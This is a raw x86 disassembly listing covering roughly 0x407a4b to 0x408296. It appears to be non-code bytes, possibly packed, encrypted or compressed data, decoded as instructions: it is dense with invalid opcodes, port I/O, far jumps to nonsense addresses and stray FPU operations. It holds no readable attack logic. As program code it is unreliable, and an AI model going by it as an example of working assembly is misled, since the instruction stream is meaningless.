  407a4b:	aad    0xb7
  407a4d:	(bad)  
  407a4e:	out    dx,al
  407a4f:	icebp  
  407a50:	std    
  407a51:	aad    0xcb
  407a53:	out    dx,eax
  407a54:	mov    ecx,0xdefddebf
  407a59:	out    0xea,eax
  407a5b:	jmp    0xc4f5:0xfce000dc
  407a62:	or     ah,bl
  407a64:	out    dx,al
  407a65:	lods   eax,DWORD PTR ds:[esi]
  407a66:	mov    bl,0xf0
  407a68:	mov    al,0xf7
  407a6a:	(bad)  
  407a6b:	jmp    0xd0df:0xd0eab8b2
  407a72:	dec    dl
  407a74:	hlt    
  407a75:	mov    ebp,0xf0e0f7f4
  407a7a:	fcmovb st,st(4)
  407a7c:	(bad)  
  407a7d:	aam    0x8
  407a7f:	jecxz  0x407a55
  407a81:	jmp    0xf30c8584
  407a86:	(bad)  
  407a87:	in     eax,0xdd
  407a89:	loope  0x407a51
  407a8b:	repz fnstenv [ecx-0x6460f32]
  407a92:	lock fcomi st,st(0)
  407a95:	pop    es
  407a96:	sti    
  407a97:	fcomip st,st(1)
  407a99:	fsubp  st(3),st
  407a9b:	rol    ch,1
  407a9d:	out    dx,eax
  407a9e:	retf   0xc6f4
  407aa1:	enter  0xcdc4,0xed
  407aa5:	in     al,dx
  407aa6:	rep repnz stos DWORD PTR es:[edi],eax
  407aa9:	lods   al,BYTE PTR ds:[esi]
  407aaa:	shl    ebp,1
  407aac:	call   0xc6095471
  407ab1:	mov    esp,0xe1beefec
  407ab6:	int    0xee
  407ab8:	mov    esp,0xf9f00bec
  407abd:	cmc    
  407abe:	add    BYTE PTR [ebx],cl
  407ac0:	lds    ecx,FWORD PTR [edi]
  407ac2:	fild   WORD PTR [edx+ebp*4]
  407ac5:	rol    edi,0xa4
  407ac8:	in     eax,dx
  407ac9:	lods   eax,DWORD PTR ds:[esi]
  407aca:	ret    
  407acb:	jmp    0xfef5:0xf6ffe4c5
  407ad2:	repnz mov al,0xd9
  407ad5:	in     al,dx
  407ad6:	fcom   st(5)
  407ad8:	std    
  407ad9:	ret    0xfedc
  407adc:	aam    0xc2
  407ade:	call   0xe50d52f0
  407ae3:	(bad)  
  407ae5:	test   al,0xe0
  407ae7:	int    0xd4
  407ae9:	call   0xe5f66fcf
  407aee:	test   ebp,0xe8bff8ca
  407af4:	(bad)  
  407af6:	loop   0x407aee
  407af8:	ret    
  407af9:	push   es
  407afa:	fndisi(8087 only) 
  407afc:	cmc    
  407afd:	in     al,0xfb
  407aff:	add    eax,0x3d30707
  407b04:	int    0xdd
  407b06:	(bad)  
  407b07:	in     al,dx
  407b08:	mov    esp,0xe0ebc7e3
  407b0d:	hlt    
  407b0e:	retf   0xc8f4
  407b11:	cld    
  407b12:	fcom   st(1)
  407b14:	stc    
  407b15:	(bad)  
  407b17:	push   es
  407b18:	(bad)  
  407b19:	mov    ebp,0xc2e7eadf
  407b1e:	rol    eax,0xa
  407b21:	repz jecxz 0x407aef
  407b24:	(bad)  
  407b25:	mov    al,0xb3
  407b27:	mov    dh,0xce
  407b29:	in     al,dx
  407b2a:	jmp    0xc6196508
  407b2f:	mov    al,0xd3
  407b31:	shl    bl,cl
  407b33:	mov    eax,0xccf6dbe2
  407b38:	mov    ebx,0xbf2fafd
  407b3d:	bswap  edx
  407b3f:	cli    
  407b40:	into   
  407b41:	fucomi st,st(1)
  407b43:	fistp  QWORD PTR [ebp-0x373c0829]
  407b49:	out    dx,al
  407b4a:	aam    0xb7
  407b4c:	retf   0xcbcf
  407b4f:	ror    edi,cl
  407b51:	hlt    
  407b52:	in     al,dx
  407b53:	mov    ebp,0xeed8d5df
  407b58:	icebp  
  407b59:	hlt    
  407b5a:	or     ch,bl
  407b5c:	xlat   BYTE PTR ds:[ebx]
  407b5d:	or     ebp,ebx
  407b5f:	fild   DWORD PTR [edx]
  407b61:	stc    
  407b62:	add    edi,ebx
  407b64:	rcr    al,0xde
  407b67:	loopne 0x407b1f
  407b69:	loope  0x407b58
  407b6b:	jmp    0xba0d6e22
  407b70:	in     eax,dx
  407b71:	fnstsw WORD PTR [esi-0xa110524]
  407b77:	fild   DWORD PTR [ecx]
  407b79:	out    0xd7,al
  407b7b:	lock ret 0xc7d8
  407b7f:	in     eax,dx
  407b80:	int    0xe3
  407b82:	fimul  DWORD PTR [eax]
  407b84:	jmp    0x407b5d
  407b86:	int3   
  407b87:	ror    bl,cl
  407b89:	mov    al,0xf2
  407b8b:	ret    0xd2c0
  407b8e:	sti    
  407b8f:	lock (bad) 
  407b91:	fdivr  QWORD PTR [edi+ebx*8-0x42ff233f]
  407b98:	pop    es
  407b99:	stc    
  407b9a:	shl    dh,1
  407b9c:	in     al,0xf6
  407b9e:	(bad)  
  407b9f:	test   BYTE PTR [ecx],0x7
  407ba2:	iret   
  407ba3:	frstor [edi-0x381d0951]
  407ba9:	xlat   BYTE PTR ds:[ebx]
  407baa:	fisubr DWORD PTR [eax-0xd215116]
  407bb0:	into   
  407bb1:	fcmovu st,st(6)
  407bb3:	out    dx,eax
  407bb4:	ret    0xc0cc
  407bb7:	push   es
  407bb8:	push   es
  407bb9:	sar    cl,0xcb
  407bbc:	retf   0xe301
  407bbf:	jmp    0x407bb0
  407bc1:	jecxz  0x407ba0
  407bc3:	fxam   
  407bc5:	int    0xae
  407bc7:	leave  
  407bc8:	into   
  407bc9:	jmp    0xe9f755be
  407bce:	aam    0xc8
  407bd0:	clc    
  407bd1:	hlt    
  407bd2:	shl    ah,cl
  407bd4:	shl    esi,cl
  407bd6:	add    ebx,eax
  407bd8:	mov    ebx,0xe6dec7fe
  407bdd:	cld    
  407bde:	aad    0x0
  407be0:	fucomip st,st(4)
  407be2:	fsubr  st(3),st
  407be4:	mov    cl,0xe6
  407be6:	leave  
  407be7:	iret   
  407be8:	enter  0xb7c9,0xc9
  407bec:	mov    bh,0xd1
  407bee:	mov    ecx,0xbdcdd6de
  407bf3:	add    bh,dl
  407bf5:	out    dx,al
  407bf6:	fstp   st(6)
  407bf8:	add    cl,bl
  407bfa:	(bad)  
  407bfb:	(bad)  
  407bfc:	push   es
  407bfd:	test   eax,0xc804debc
  407c03:	fldcw  WORD PTR [ecx-0x421b3210]
  407c09:	in     eax,0xb2
  407c0b:	mov    cl,0xe9
  407c0d:	shr    al,0xea
  407c10:	lock fdivr DWORD PTR [ecx-0x420e2644]
  407c17:	fcmovbe st,st(5)
  407c19:	not    bh
  407c1b:	retf   0xf8d6
  407c1e:	loopne 0x407c0e
  407c20:	hlt    
  407c21:	or     DWORD PTR ds:0xd6adad09,eax
  407c27:	retf   
  407c28:	mov    cl,0xd5
  407c2a:	(bad)  
  407c2b:	sar    BYTE PTR [edx-0x12100812],1
  407c31:	mov    esp,0xd600c803
  407c36:	fst    st(6)
  407c38:	int3   
  407c39:	rol    edi,1
  407c3b:	aad    0xf7
  407c3d:	(bad)  
  407c3f:	jmp    0x407c35
  407c41:	or     ebp,eax
  407c43:	jmp    0xedf7:0xe9c1e8d1
  407c4a:	xlat   BYTE PTR ds:[ebx]
  407c4b:	loope  0x407c39
  407c4d:	in     al,0xba
  407c4f:	aad    0xd7
  407c51:	int    0xbb
  407c53:	mov    esp,0xd2f2ddf9
  407c58:	add    ch,bh
  407c5a:	test   DWORD PTR [ecx],0xdf6c1fc
  407c60:	fldz   
  407c62:	jecxz  0x407c76
  407c64:	(bad)  
  407c65:	in     al,0xbe
  407c67:	repz (bad) 
  407c6a:	mov    bl,0xea
  407c6c:	in     al,dx
  407c6d:	mov    cl,0xc4
  407c6f:	in     al,0xeb
  407c71:	fnstcw WORD PTR [eax-0x806ff2b]
  407c77:	repz fistp QWORD PTR [ebp-0x9380e1d]
  407c7e:	jecxz  0x407c5b
  407c80:	or     al,0xff
  407c82:	fucom  st(0)
  407c84:	(bad)  
  407c86:	in     eax,dx
  407c87:	aad    0xe8
  407c89:	test   ch,0xba
  407c8c:	(bad)  
  407c8d:	in     eax,0xf2
  407c8f:	lods   al,BYTE PTR ds:[esi]
  407c90:	(bad)
  407c93:	jecxz  0x407c8b
  407c95:	iret   
  407c96:	out    dx,al
  407c97:	(bad)  
  407c98:	out    0x4,al
  407c9a:	out    0x5,al
  407c9c:	rol    BYTE PTR [esi],0x4
  407c9f:	cli    
  407ca0:	fadd   DWORD PTR ds:0xcec9c0eb
  407ca6:	fisubr WORD PTR [eax-0x4d3d1818]
  407cac:	call   0xf21a5063
  407cb1:	mov    dl,0xf6
  407cb3:	iret   
  407cb4:	out    dx,eax
  407cb5:	fcmovbe st,st(1)
  407cb7:	rcr    ah,0xd4
  407cba:	std    
  407cbb:	dec    bl
  407cbd:	loop   0x407c9a
  407cbf:	ffreep st(7)
  407cc1:	cld    
  407cc2:	out    dx,eax
  407cc3:	(bad)  
  407cc4:	out    0xcc,eax
  407cc6:	shr    BYTE PTR [esi+esi*8-0x3a0e330a],1
  407ccd:	loopne 0x407c89
  407ccf:	(bad)  
  407cd0:	rcl    cl,1
  407cd2:	test   ebp,0xf1efe8de
  407cd8:	in     eax,0xc2
  407cda:	call   eax
  407cdc:	leave  
  407cdd:	(bad)  
  407cde:	fdivr  st(4),st
  407ce0:	in     al,0xfe
  407ce2:	or     eax,0xb0a8be05
  407ce7:	(bad)  
  407ce8:	retf   0xd6b3
  407ceb:	ror    dl,1
  407ced:	clc    
  407cee:	mov    ch,0xed
  407cf0:	call   0xbb093aa7
  407cf5:	lock mov ch,0xf5
  407cf8:	int3   
  407cf9:	add    eax,eax
  407cfb:	in     eax,0xfe
  407cfd:	call   0x5188a09
  407d02:	repz iret 
  407d04:	mov    esp,0xf5a8b3dc
  407d09:	retf   
  407d0a:	(bad)
  407d0d:	(bad)  
  407d0e:	out    dx,eax
  407d0f:	int3   
  407d10:	aad    0xf5
  407d12:	leave  
  407d13:	(bad)  
  407d15:	sti    
  407d16:	lock aam 0xd6
  407d19:	in     eax,0xd9
  407d1b:	in     eax,0xd9
  407d1d:	ror    DWORD PTR [eax],0xc9
  407d20:	fmul   st(7),st
  407d22:	in     eax,0x3
  407d24:	(bad)  
  407d25:	mov    esi,0xeed3afe2
  407d2a:	shl    esi,1
  407d2c:	out    0xf4,al
  407d2e:	fld    st(4)
  407d30:	sar    edi,cl
  407d32:	icebp  
  407d33:	(bad)  
  407d35:	cli    
  407d36:	icebp  
  407d37:	sar    dl,1
  407d39:	(bad)  
  407d3a:	repnz fisttp WORD PTR [eax]
  407d3d:	out    dx,eax
  407d3e:	test   DWORD PTR ds:0xcc030dc5,0xeec5decd
  407d48:	(bad)  
  407d49:	mov    bh,0xf3
  407d4b:	mov    dl,0xc1
  407d4d:	jmp    0x407d3d
  407d4f:	call   0xd2344723
  407d54:	mov    bh,0xef
  407d56:	cli    
  407d57:	mov    ah,0xdc
  407d59:	fcomp  st(2)
  407d5b:	loopne 0x407d1d
  407d5d:	add    bh,dh
  407d5f:	fld    DWORD PTR [esi]
  407d61:	retf   0xface
  407d64:	fldcw  WORD PTR [eax-0x43361c54]
  407d6a:	cli    
  407d6b:	shr    ebp,cl
  407d6d:	scas   al,BYTE PTR es:[edi]
  407d6e:	jmp    0xd6bf:0xccfedde5
  407d75:	ret    
  407d76:	into   
  407d77:	fdivr  QWORD PTR [ebx-0x2f1e0915]
  407d7d:	cli    
  407d7e:	jmp    0x407d67
  407d80:	fcmovnb st,st(4)
  407d82:	(bad)  
  407d84:	rcr    esi,cl
  407d86:	fidiv  WORD PTR [esi-0xa4f3f14]
  407d8c:	lock ror edi,cl
  407d8f:	std    
  407d90:	aad    0xb8
  407d92:	mov    ecx,0xf700d9cd
  407d97:	pop    es
  407d98:	shl    ah,cl
  407d9a:	(bad)  
  407d9b:	lock call 0x8697e
  407da1:	in     eax,0x7
  407da3:	(bad)  
  407da5:	mov    cl,0xa5
  407da7:	out    dx,eax
  407da8:	scas   al,BYTE PTR es:[edi]
  407da9:	(bad)  
  407daa:	loopne 0x407d67
  407dac:	lock mov ah,0xc6
  407daf:	sar    bl,1
  407db1:	out    dx,eax
  407db2:	mov    ch,0xec
  407db4:	clc    
  407db5:	cmc    
  407db6:	int    0xfc
  407db8:	aam    0xe1
  407dba:	add    al,0xc1
  407dbc:	(bad)  
  407dbe:	shr    ch,0xf5
  407dc1:	fild   WORD PTR [ebx]
  407dc3:	out    dx,eax
  407dc4:	into   
  407dc5:	shl    ebp,cl
  407dc7:	jecxz  0x407d78
  407dc9:	repnz loopne 0x407dbd
  407dcc:	mov    edx,0xe5b8d0f5
  407dd1:	fst    st(7)
  407dd3:	(bad)  
  407dd5:	std    
  407dd6:	fst    st(6)
  407dd8:	ret    
  407dd9:	sar    BYTE PTR [ecx-0x1b1ff4fb],1
  407ddf:	add    al,0xfb
  407de1:	clc    
  407de2:	bnd jmp 0xc6f33ea9
  407de8:	out    dx,al
  407de9:	ret    
  407dea:	lock loop 0x407de0
  407ded:	sti    
  407dee:	lock iret 
  407df0:	std    
  407df1:	mov    eax,0xe0d4cff2
  407df6:	mov    esi,0xc7d8ffc7
  407dfb:	or     ah,al
  407dfd:	add    bh,cl
  407dff:	add    eax,0xc05e5db
  407e04:	test   al,0xe7
  407e06:	les    edi,FWORD PTR [ebp+edx*8-0x34303e2a]
  407e0d:	aad    0xef
  407e0f:	mov    edx,0xe8bfc9f9
  407e14:	(bad)  
  407e15:	fstp   TBYTE PTR [eax-0x22231f3e]
  407e1b:	sti    
  407e1c:	add    al,0xeb
  407e1e:	fiadd  WORD PTR ds:0xcee3ff0f
  407e24:	repz leave 
  407e26:	rol    ebp,cl
  407e28:	test   ebx,0xe9afc8cd
  407e2e:	(bad)  
  407e2f:	in     al,dx
  407e30:	shl    eax,1
  407e32:	int3   
  407e33:	fnstsw ax
  407e35:	(bad)  
  407e36:	cmc    
  407e37:	cmc    
  407e38:	in     al,dx
  407e39:	loope  0x407e0c
  407e3b:	add    ebp,esi
  407e3d:	sti    
  407e3e:	cmc    
  407e3f:	jmp    0xe7e7:0x110a0aee
  407e46:	mov    esp,0xc0f6e8ca
  407e4b:	mov    al,0xee
  407e4d:	retf   0xbadb
  407e50:	retf   0xeaee
  407e53:	leave  
  407e54:	(bad)  
  407e56:	lock fistp QWORD PTR [ebp-0x1f000409]
  407e5d:	clc    
  407e5e:	add    eax,0xfe0fe3fd
  407e63:	iret   
  407e64:	jmp    0xe901425c
  407e69:	scas   al,BYTE PTR es:[edi]
  407e6a:	enter  0xf1ba,0xdf
  407e6e:	xlat   BYTE PTR ds:[ebx]
  407e6f:	shl    ch,1
  407e71:	mov    dh,0xea
  407e73:	into   
  407e74:	ret    
  407e75:	aad    0xfd
  407e77:	add    al,bh
  407e79:	(bad)  
  407e7a:	in     al,0xc7
  407e7c:	jmp    0x706623f
  407e81:	push   es
  407e82:	out    0x1,eax
  407e84:	jmp    0xc5b1:0xabcdf7c9
  407e8b:	mov    bh,0xeb
  407e8d:	iret   
  407e8e:	shr    esp,cl
  407e90:	mov    ebp,0xccf3dbcc
  407e95:	int    0xf1
  407e97:	stc    
  407e98:	mov    DWORD PTR [ebx],0xcac9d7d3
  407e9e:	shr    ch,0xc
  407ea1:	push   cs
  407ea2:	cld    
  407ea3:	stc    
  407ea4:	out    dx,al
  407ea5:	rol    eax,1
  407ea7:	int3   
  407ea8:	stos   DWORD PTR es:[edi],eax
  407ea9:	lods   eax,DWORD PTR ds:[esi]
  407eaa:	sar    cl,cl
  407eac:	aad    0xee
  407eae:	faddp  st(6),st
  407eb0:	aam    0xee
  407eb2:	fdiv   st(7),st
  407eb4:	add    ebx,eax
  407eb6:	fadd   DWORD PTR [edx]
  407eb8:	add    al,BYTE PTR ds:0xcaebd7cb
  407ebe:	fild   DWORD PTR [edi]
  407ec0:	out    dx,eax
  407ec1:	(bad)
  407ec4:	sar    BYTE PTR [esi-0x4a532242],cl
  407eca:	enter  0xf4d3,0xd8
  407ece:	enter  0xb5d1,0xf9
  407ed2:	mov    edi,0xd0f6babb
  407ed7:	add    esi,edi
  407ed9:	(bad)  
  407eda:	(bad)  
  407edc:	ret    
  407edd:	lock in al,0xe9
  407ee0:	out    dx,al
  407ee1:	xabort 0x5
  407ee4:	sar    BYTE PTR [ebp-0x1a2e3410],0xf6
  407eeb:	(bad)
  407eee:	enter  0xd0ee,0xe8
  407ef2:	rol    edx,cl
  407ef4:	mov    eax,0xfadad0fc
  407ef9:	(bad)  
  407efb:	(bad)  
  407efd:	add    al,0xe6
  407eff:	(bad)  
  407f01:	out    0xd,al
  407f03:	pop    es
  407f04:	fbld   TBYTE PTR [esi-0x1713344e]
  407f0a:	cmc    
  407f0b:	rcl    eax,1
  407f0d:	fxch   st(1)
  407f0f:	(bad)  
  407f11:	xlat   BYTE PTR ds:[ebx]
  407f12:	mov    edx,0xe2effb01
  407f17:	hlt    
  407f18:	pop    es
  407f19:	in     al,0xc0
  407f1b:	rol    DWORD PTR [ebx],0xeb
  407f1e:	add    BYTE PTR [ecx+ecx*1],al
  407f21:	mov    BYTE PTR [edi],0x12
  407f24:	iret   
  407f25:	in     al,dx
  407f26:	in     eax,0xc7
  407f28:	int3   
  407f29:	shl    eax,cl
  407f2b:	int3   
  407f2c:	lock xlat BYTE PTR ds:[ebx]
  407f2e:	mov    ah,0xd2
  407f30:	mov    ecx,0xd5fdf6c9
  407f35:	cld    
  407f36:	loop   0x407f1b
  407f38:	(bad)  
  407f3a:	cld    
  407f3b:	rol    BYTE PTR [ebx],cl
  407f3d:	loopne 0x407f45
  407f3f:	jmp    0x407f20
  407f41:	out    dx,al
  407f42:	iret   
  407f43:	push   cs
  407f44:	scas   al,BYTE PTR es:[edi]
  407f45:	leave  
  407f46:	mov    ebp,0xc9f0c9e0
  407f4b:	hlt    
  407f4c:	xlat   BYTE PTR ds:[ebx]
  407f4d:	xlat   BYTE PTR ds:[ebx]
  407f4e:	hlt    
  407f4f:	int    0xc4
  407f51:	fstp   TBYTE PTR [ebx+eax*8-0x3e3d3d22]
  407f58:	in     eax,0xbd
  407f5a:	sar    eax,1
  407f5c:	fdiv   st(5),st
  407f5e:	(bad)  
  407f5f:	(bad)  
  407f60:	jmp    0xce337974
  407f65:	scas   al,BYTE PTR es:[edi]
  407f66:	(bad)  
  407f68:	retf   0xc7b5
  407f6b:	mov    edx,0xe9e7b8e0
  407f70:	xlat   BYTE PTR ds:[ebx]
  407f71:	mov    edi,0xffd1fffe
  407f76:	int    0xf9
  407f78:	out    0xc6,al
  407f7a:	fsub   st,st(2)
  407f7c:	(bad)  
  407f7d:	loop   0x407f87
  407f7f:	ffreep st(3)
  407f81:	add    eax,0xccdcc804
  407f86:	mov    bh,0xbe
  407f88:	les    esi,FWORD PTR [ebx+edx*8-0x6073a49]
  407f8f:	stc    
  407f90:	std    
  407f91:	stc    
  407f92:	enter  0xb8b8,0xb6
  407f96:	add    eax,edi
  407f98:	sti    
  407f99:	shl    ah,0xb
  407f9c:	fadd   DWORD PTR [eax+eax*8]
  407f9f:	(bad)  
  407fa0:	(bad)  
  407fa2:	loop   0x407f91
  407fa4:	ret    0xc0d3
  407fa7:	bnd ret 0xecf5
  407fab:	out    0xb4,eax
  407fad:	mov    ch,0xd1
  407faf:	int    0xf6
  407fb1:	rcl    esi,cl
  407fb3:	(bad)  
  407fb5:	mov    eax,0xdc00d3c3
  407fba:	cld    
  407fbb:	jecxz  0x407fad
  407fbd:	aam    0xf9
  407fbf:	aad    0xcb
  407fc1:	iret   
  407fc2:	fcmove st,st(5)
  407fc4:	fsubr  QWORD PTR [ecx-0x43a2a0e]
  407fca:	leave  
  407fcb:	aad    0xe5
  407fcd:	idiv   edx
  407fcf:	call   esp
  407fd1:	retf   
  407fd2:	(bad)  
  407fd3:	mov    al,0xb7
  407fd5:	hlt    
  407fd6:	aam    0x2
  407fd8:	(bad)  
  407fd9:	cmc    
  407fda:	ret    
  407fdb:	(bad)  
  407fdc:	cld    
  407fdd:	cli    
  407fde:	retf   
  407fdf:	jmp    0x407fc4
  407fe1:	jmp    0xe80464e2
  407fe6:	ror    dh,1
  407fe8:	scas   al,BYTE PTR es:[edi]
  407fe9:	icebp  
  407fea:	fcmovnbe st,st(1)
  407fec:	stc    
  407fed:	mov    cl,0xc5
  407fef:	mov    esi,0xbaf2f9b7
  407ff4:	iret   
  407ff5:	fsubr  st(7),st
  407ff7:	rcl    eax,0xbc
  407ffa:	repnz std 
  407ffc:	retf   
  407ffd:	or     al,al
  407fff:	fadd   QWORD PTR [edx]
  408001:	jmp    0x408015
  408003:	in     eax,dx
  408004:	rcr    esi,1
  408006:	fsubp  st(2),st
  408008:	out    dx,eax
  408009:	mov    cl,0xa8
  40800c:	loopne 0x407fe4
  40800e:	(bad)  
  40800f:	leave  
  408010:	(bad)  
  408011:	retf   
  408012:	in     eax,dx
  408013:	sti    
  408014:	fadd   QWORD PTR [ebx]
  408016:	pop    es
  408017:	in     al,dx
  408018:	fdivr  st,st(4)
  40801a:	aad    0xdc
  40801c:	(bad)  
  40801d:	fld    DWORD PTR ds:0xedefce0b
  408023:	inc    al
  408025:	(bad)  
  408027:	icebp  
  408028:	mov    cl,0xcf
  40802a:	mov    ch,0xd0
  40802c:	(bad)  
  40802d:	rcl    dl,1
  40802f:	in     al,dx
  408030:	fxch   st(5)
  408032:	sar    eax,1
  408034:	shl    ebp,0xcd
  408037:	mov    esi,0xdce0defa
  40803c:	jmp    0xee1c8118
  408041:	call   0xaefa6735
  408046:	(bad)  
  408047:	repz in eax,dx
  408049:	mov    ah,0xbb
  40804b:	cli    
  40804c:	(bad)
  40804f:	stc    
  408050:	shl    ebx,cl
  408052:	retf   
  408053:	out    dx,al
  408054:	ror    esp,0xe0
  408057:	ret    0xc3c3
  40805a:	(bad)  
  40805b:	fsub   st,st(3)
  40805d:	out    0xfb,eax
  40805f:	or     ecx,DWORD PTR [esi]
  408061:	dec    BYTE PTR [edi]
  408063:	or     ebx,esi
  408065:	jecxz  0x408025
  408067:	ret    
  408068:	jecxz  0x408021
  40806a:	hlt    
  40806b:	mov    al,0xba
  40806d:	fldl2t 
  40806f:	icebp  
  408070:	jmp    0xb8ee:0xd2e2f2d1
  408077:	add    DWORD PTR ds:0xfddffc0b,eax
  40807d:	enter  0xe809,0xe9
  408081:	in     al,0x6
  408083:	jmp    0xc9af:0xd1c8ddae
  40808a:	icebp  
  40808b:	jmp    0x3ef:0xd8b8cef3
  408092:	cld    
  408093:	loope  0x408098
  408095:	call   0x63b6e74
  40809a:	ret    0xd1fe
  40809d:	add    ebp,eax
  40809f:	cli    
  4080a0:	out    0xcb,al
  4080a2:	fld    QWORD PTR ds:0xe4c9d1aa
  4080a8:	in     eax,0xe3
  4080aa:	fcmovnu st,st(3)
  4080ac:	(bad)  
  4080ad:	ror    esp,1
  4080af:	(bad)  
  4080b0:	sti    
  4080b1:	mov    ebx,0xd2dbb9d4
  4080b6:	(bad)  
  4080b8:	int3   
  4080b9:	(bad)  
  4080ba:	or     eax,edi
  4080bc:	add    dl,ah
  4080be:	(bad)  
  4080bf:	in     eax,dx
  4080c0:	cli    
  4080c1:	int3   
  4080c2:	loop   0x4080bc
  4080c4:	fsub   DWORD PTR [esi-0xf223e37]
  4080ca:	aam    0xc5
  4080cc:	leave  
  4080cd:	enter  0xe9c8,0xf6
  4080d1:	int3   
  4080d2:	jmp    0xfff0:0xc2bab8b0
  4080d9:	loop   0x4080d0
  4080db:	fninit 
  4080dd:	in     al,0xc7
  4080df:	jmp    0xff4049cd
  4080e4:	lods   al,BYTE PTR ds:[esi]
  4080e5:	icebp  
  4080e6:	lods   eax,DWORD PTR ds:[esi]
  4080e7:	loope  0x4080ca
  4080e9:	test   bh,0xf0
  4080ec:	stc    
  4080ed:	out    dx,al
  4080ee:	shl    BYTE PTR [edx+esi*8-0x473521fd],1
  4080f5:	cli    
  4080f6:	lock aad 0xe2
  4080f9:	idiv   BYTE PTR [ebx+ebx*8-0x301cf0fc]
  408100:	retf   0xe4cd
  408103:	int    0xc5
  408105:	stos   BYTE PTR es:[edi],al
  408106:	mov    esp,0xd2b6e2cc
  40810b:	stc    
  40810c:	fldlg2 
  40810e:	in     eax,dx
  40810f:	jmp    0x4080fc
  408111:	fcmovbe st,st(0)
  408113:	repnz ror esi,0xdc
  408117:	hlt    
  408118:	rol    ch,0xf8
  40811b:	fcmovnu st,st(4)
  40811d:	lock out 0xe7,al
  408120:	hlt    
  408121:	(bad)  
  408122:	fadd   DWORD PTR ds:0xc0adb2ce
  408128:	ror    ah,1
  40812a:	jmp    0xbffb4c28
  40812f:	faddp  st(5),st
  408131:	in     al,dx
  408132:	in     al,dx
  408133:	jmp    0xd3d8:0xf2d6fd03
  40813a:	(bad)  
  40813c:	stc    
  40813d:	shr    esi,0xbc
  408140:	push   cs
  408141:	fdivp  st(4),st
  408143:	in     al,0xd1
  408145:	lock jecxz 0x4080f9
  408148:	mov    ch,0xdc
  40814a:	iret   
  40814b:	repz ror ecx,0xde
  40814f:	mov    ah,0xba
  408151:	inc    BYTE PTR [edx]
  408153:	int3   
  408154:	shl    ah,1
  408156:	in     eax,dx
  408157:	add    bl,ah
  408159:	clc    
  40815a:	fistp  QWORD PTR [eax-0x191b2009]
  408160:	push   cs
  408161:	into   
  408162:	repnz in eax,dx
  408164:	int3   
  408165:	loopne 0x40814c
  408167:	ret    
  408168:	fsub   st(7),st
  40816a:	leave  
  40816b:	mov    ch,0xd0
  40816d:	sti    
  40816e:	lods   eax,DWORD PTR ds:[esi]
  40816f:	xlat   BYTE PTR ds:[ebx]
  408170:	iret   
  408171:	mov    edi,0xfcf6c3fa
  408176:	out    dx,eax
  408177:	loope  0x40813e
  408179:	hlt    
  40817a:	push   es
  40817b:	fild   WORD PTR ds:0xe9e1cae7
  408181:	in     al,0xdc
  408183:	fucom  st(2)
  408185:	iret   
  408186:	xlat   BYTE PTR ds:[ebx]
  408187:	lock shl cl,cl
  40818a:	mov    bh,0xb5
  40818c:	sar    edi,cl
  40818e:	shr    ch,1
  408190:	mov    ch,0xbc
  408192:	add    esi,esp
  408194:	aam    0xe2
  408196:	int    0xd8
  408198:	mov    esi,0xc40b03f8
  40819d:	stc    
  40819e:	loopne 0x408189
  4081a0:	or     bh,ah
  4081a2:	fist   WORD PTR [ebx]
  4081a4:	(bad)  
  4081a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a7:	into   
  4081a8:	loopne 0x408178
  4081aa:	(bad)  
  4081ab:	sti    
  4081ac:	leave  
  4081ad:	mov    bh,0xc9
  4081af:	aam    0xe5
  4081b1:	aad    0xf4
  4081b3:	shl    bl,cl
  4081b5:	jecxz  0x408176
  4081b7:	in     eax,dx
  4081b8:	cli    
  4081b9:	(bad)  
  4081ba:	cmc    
  4081bb:	add    BYTE PTR [edi],al
  4081bd:	cld    
  4081be:	leave  
  4081bf:	or     eax,0x605c2cb
  4081c4:	lock into 
  4081c6:	shl    edi,cl
  4081c8:	ret    0xc8b2
  4081cb:	lods   al,BYTE PTR ds:[esi]
  4081cc:	in     eax,dx
  4081cd:	(bad)  
  4081ce:	div    ecx
  4081d0:	(bad)  
  4081d1:	cmc    
  4081d2:	neg    esp
  4081d4:	int3   
  4081d5:	out    dx,al
  4081d6:	cld    
  4081d7:	fdivr  st(4),st
  4081d9:	neg    al
  4081db:	pop    es
  4081dc:	in     al,0xc7
  4081de:	add    dl,ch
  4081e0:	loope  0x4081e5
  4081e2:	or     edx,ebx
  4081e4:	out    0xb0,al
  4081e6:	loop   0x4081ad
  4081e8:	in     al,0xd3
  4081ea:	lods   eax,DWORD PTR ds:[esi]
  4081eb:	cmc    
  4081ec:	out    dx,eax
  4081ed:	shl    edi,1
  4081ef:	shl    BYTE PTR [esi-0xd2908fd],cl
  4081f5:	add    al,bh
  4081f7:	fadd   DWORD PTR [edx]
  4081f9:	mov    esi,0x2bff8da
  4081fe:	lsl    eax,WORD PTR [eax+ebx*8]
  408202:	out    0xc9,al
  408204:	in     al,dx
  408205:	faddp  st(3),st
  408207:	jmp    0xfbda:0xc9b0c7b1
  40820e:	jmp    0x408206
  408210:	shl    dl,cl
  408212:	add    cl,dl
  408214:	cld    
  408215:	fadd   DWORD PTR [edi]
  408217:	out    0xf9,eax
  408219:	cmc    
  40821a:	in     al,0xf5
  40821c:	fcmovnu st,st(6)
  40821e:	loopne 0x408202
  408220:	out    0xf,eax
  408222:	or     ebx,esi
  408224:	in     eax,dx
  408225:	jmp    0x40820c
  408227:	ret    0xacc0
  40822a:	mov    cl,0xe9
  40822c:	clc    
  40822d:	call   0xda054c20
  408232:	loop   0x408223
  408234:	mov    ecx,0xfcdffbd4
  408239:	(bad)  
  40823a:	(bad)  
  40823b:	loope  0x408225
  40823d:	or     ah,cl
  40823f:	(bad)  
  408240:	fdivp  st(5),st
  408242:	or     al,0x4
  408244:	fsubr  st(1),st
  408246:	test   al,0xde
  408248:	retf   0xdbc0
  40824b:	mov    bh,0xdb
  40824d:	(bad)  
  40824e:	(bad)  
  40824f:	(bad)
  408252:	shl    ebx,1
  408254:	mov    ecx,0xdbe0e0f9
  408259:	loop   0x40822e
  40825b:	neg    edx
  40825d:	bswap  ecx
  40825f:	out    0xf8,al
  408261:	int    0xd8
  408263:	add    ch,BYTE PTR [ecx-0x3d393e53]
  408269:	lods   eax,DWORD PTR ds:[esi]
  40826a:	(bad)  
  40826b:	(bad)  
  40826c:	call   0xec15525c
  408271:	aad    0xe2
  408273:	repz fdiv st(7),st
  408276:	out    dx,eax
  408277:	rcl    ch,0xdd
  40827a:	or     edx,ecx
  40827c:	ror    BYTE PTR [ecx],0x4
  40827f:	add    eax,0xa0e0ee3
  408284:	fmul   st,st(0)
  408286:	jmp    0xebd5:0xb6c8d4cb
  40828d:	mov    cl,0xf3
  40828f:	div    DWORD PTR [esi-0x4470624]
  408295:	int3   
  408296:	stc    
